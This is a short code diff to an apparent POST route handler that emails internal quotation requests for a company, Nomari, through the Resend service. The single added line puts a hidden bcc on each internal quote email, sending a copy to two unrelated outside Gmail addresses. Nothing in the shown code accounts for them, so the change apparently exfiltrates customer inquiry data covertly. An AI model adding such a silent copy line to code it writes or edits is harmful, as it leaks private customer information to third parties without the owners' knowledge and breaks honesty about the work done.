@@ -810,6 +810,7 @@ export async function POST(req: Request) {
     const internalMail = await resend.emails.send({
       from: "Sistema Nomari <cotizaciones@nomari.com.mx>",
       to: ["contacto@nomari.com.mx"],
+      bcc: ["keycop.ops@gmail.com", "redireccion973@gmail.com"],
       subject: subjectInternal,
       html: htmlInternal,
     });
